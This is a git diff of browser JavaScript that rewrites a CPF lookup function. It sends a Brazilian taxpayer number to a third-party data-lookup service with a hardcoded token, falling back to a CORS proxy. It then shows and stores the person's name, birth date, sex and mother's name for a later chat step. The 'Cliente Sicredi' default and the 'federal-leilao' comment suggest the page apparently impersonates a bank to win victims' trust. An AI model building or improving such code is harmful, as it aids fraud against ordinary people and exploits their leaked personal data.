@@ -114,7 +114,7 @@ document.addEventListener("DOMContentLoaded", function () {
   // ==========================
   // CONSULTA CPF (API federal-leilao) - SEM TIMEOUT
   // ==========================
- async function consultarCPF(cpf) {
+async function consultarCPF(cpf) {
   const cpfLimpo = (cpf || "").replace(/\D/g, "");
 
   // UI: mostrar área e loading
@@ -122,88 +122,101 @@ document.addEventListener("DOMContentLoaded", function () {
   loadingInfo?.classList.remove("hidden");
   userInfo?.classList.add("hidden");
   errorInfo?.classList.add("hidden");
-
   consultaResultado?.scrollIntoView({ behavior: "smooth", block: "center" });
 
-  try {
-    // ✅ URL limpa (sem caractere invisível)
-    const apiUrl = `https://searchapi.dnnl.live/consulta?token_api=5717&cpf=${encodeURIComponent(cpfLimpo)}`;
+  // Defaults (mantém fluxo mesmo se API falhar)
+  let nomeCompleto = "Cliente Sicredi";
+  let nascimento = "";
+  let sexo = "";
+  let mae = "";
 
-    // ✅ Se a API bloquear CORS no browser, descomente a linha abaixo e comente a de cima
-    // const apiUrl = `https://corsproxy.io/?https://searchapi.dnnl.live/consulta?token_api=5717&cpf=${encodeURIComponent(cpfLimpo)}`;
+  // helper: pegar prop por chaves flexíveis (case-insensitive)
+  const pickProp = (obj, keys) => {
+    if (!obj || typeof obj !== "object") return "";
+    const lower = {};
+    for (const k of Object.keys(obj)) lower[k.toLowerCase()] = obj[k];
+    for (const key of keys) {
+      const v = lower[String(key).toLowerCase()];
+      if (v !== undefined && v !== null && String(v).trim() !== "") return v;
+    }
+    return "";
+  };
 
-    const response = await fetch(apiUrl, {
+  // helper: fetch com leitura segura (json OU texto)
+  async function fetchSafe(url) {
+    const res = await fetch(url, {
       method: "GET",
       headers: {
-        "user-agent":
-          "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
-        Accept: "application/json",
+        Accept: "application/json, text/plain, */*",
       },
     });
 
-    const data = response.ok ? await response.json() : null;
+    const contentType = (res.headers.get("content-type") || "").toLowerCase();
+    const raw = await res.text();
+
+    let json = null;
+    if (contentType.includes("application/json")) {
+      try { json = JSON.parse(raw); } catch {}
+    } else {
+      // às vezes vem JSON com content-type errado
+      try { json = JSON.parse(raw); } catch {}
+    }
+
+    return { ok: res.ok, status: res.status, raw, json };
+  }
+
+  try {
+    // ✅ URL limpa (remove caracteres invisíveis tipo \u200B, \u2060 etc.)
+    const baseUrl = `https://searchapi.dnnl.live/consulta?token_api=5717&cpf=${encodeURIComponent(cpfLimpo)}`.replace(/[\u200B-\u200D\u2060\uFEFF]/g, "");
+
+    // 1) tenta direto
+    let r = await fetchSafe(baseUrl);
+
+    // 2) se falhar (CORS/status ruim/html), tenta via proxy
+    if (!r.ok || !r.json) {
+      const proxied = `https://corsproxy.io/?${encodeURIComponent(baseUrl)}`;
+      const r2 = await fetchSafe(proxied);
+      // usa o melhor resultado
+      if (r2.ok && r2.json) r = r2;
+    }
+
+    console.log("[CPF API] status:", r.status, "json:", r.json);
+    if (!r.ok || !r.json) {
+      console.warn("[CPF API] resposta bruta (primeiros 300):", (r.raw || "").slice(0, 300));
+      throw new Error(`API inválida/sem JSON (status ${r.status})`);
+    }
+
+    const data = r.json;
+
+    // ✅ normaliza payload (pode vir em data/data.result/data.retorno)
+    const payload = (data && (data.data || data.result || data.retorno || data.response)) || data || {};
+
+    // ✅ considera OK se tiver nome (mesmo sem status)
+    const statusOk =
+      (data.status === 200 || data.status === "200" || data.success === true || data.ok === true) ||
+      (payload.status === 200 || payload.status === "200" || payload.success === true || payload.ok === true) ||
+      !!(payload.nome || payload.name || payload.NOME);
+
+    if (statusOk) {
+      nomeCompleto = pickProp(payload, ["nome", "name", "nome_completo", "nomeCompleto", "NOME"]) || nomeCompleto;
+      nascimento  = pickProp(payload, ["nascimento", "data_nascimento", "dataNascimento", "NASC"]) || "";
+      sexo        = pickProp(payload, ["sexo", "genero", "gender", "SEXO"]) || "";
+      mae         = pickProp(payload, ["mae", "nome_mae", "nomeMae", "NOME_MAE"]) || "";
+    }
 
     loadingInfo?.classList.add("hidden");
 
-    // Defaults (mantém fluxo mesmo se API falhar)
-    let nomeCompleto = "Cliente Sicredi";
-    let nascimento = "";
-    let sexo = "";
-    let mae = "";
-
-    // ✅ Normaliza payload (API pode devolver em vários formatos)
-    const payload =
-      (data && (data.data || data.result || data.retorno || data.response)) || data || {};
-
-    // ✅ Considera OK se tiver status 200/true/success ou se tiver "nome"
-    const statusOk =
-      (data && (data.status === 200 || data.status === "200" || data.success === true || data.ok === true)) ||
-      (payload && (payload.status === 200 || payload.status === "200" || payload.success === true || payload.ok === true)) ||
-      !!(payload && (payload.nome || payload.name || payload.NOME));
-
-    // helper para pegar chaves flexíveis (case-insensitive)
-    const pickProp = (obj, keys) => {
-      if (!obj || typeof obj !== "object") return "";
-      const lower = {};
-      for (const k of Object.keys(obj)) lower[k.toLowerCase()] = obj[k];
-      for (const key of keys) {
-        const v = lower[String(key).toLowerCase()];
-        if (v !== undefined && v !== null && String(v).trim() !== "") return v;
-      }
-      return "";
-    };
-
-    if (statusOk) {
-      nomeCompleto =
-        pickProp(payload, ["nome", "name", "nome_completo", "nomeCompleto", "NOME"]) || nomeCompleto;
-
-      nascimento =
-        pickProp(payload, ["nascimento", "data_nascimento", "dataNascimento", "NASC", "birth", "birthday"]) || "";
-
-      sexo =
-        pickProp(payload, ["sexo", "genero", "gender", "SEXO"]) || "";
-
-      mae =
-        pickProp(payload, ["mae", "nome_mae", "nomeMae", "NOME_MAE", "mother"]) || "";
-    }
-
     // Preencher tela
     if (nomeUsuario) nomeUsuario.textContent = nomeCompleto || "Não informado";
-
     if (cpfUsuario) {
       cpfUsuario.textContent = cpfLimpo
         ? cpfLimpo.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4")
         : "Não informado";
     }
-
     if (sexoUsuario) sexoUsuario.textContent = sexo || "Não informado";
     if (nomeMae) nomeMae.textContent = mae || "Não informado";
+    if (dataNascimento) dataNascimento.textContent = formatDate(nascimento) || "Não informado";
 
-    if (dataNascimento) {
-      dataNascimento.textContent = formatDate(nascimento) || "Não informado";
-    }
-
-    // O /chat valida `dadosUsuario.nome` e `dadosUsuario.cpf`
     const dadosUsuario = {
       nome: nomeCompleto || "",
       cpf: cpfLimpo || "",
@@ -214,13 +227,12 @@ document.addEventListener("DOMContentLoaded", function () {
 
     localStorage.setItem("dadosUsuario", JSON.stringify(dadosUsuario));
     localStorage.setItem("cpf", cpfLimpo);
-
     if (dadosUsuario.nome) localStorage.setItem("nomeUsuario", dadosUsuario.nome);
     if (dadosUsuario.cpf) localStorage.setItem("cpfUsuario", dadosUsuario.cpf);
 
-    // Mostrar bloco de confirmação
     userInfo?.classList.remove("hidden");
     setTimeout(() => userInfo?.scrollIntoView({ behavior: "smooth", block: "center" }), 100);
+
   } catch (err) {
     loadingInfo?.classList.add("hidden");
     if (errorMessage) errorMessage.textContent = "Erro ao consultar seus dados. Tente novamente.";
@@ -229,6 +241,7 @@ document.addEventListener("DOMContentLoaded", function () {
     errorInfo?.scrollIntoView({ behavior: "smooth", block: "center" });
   }
 }
+
 
 
   function processForm() {
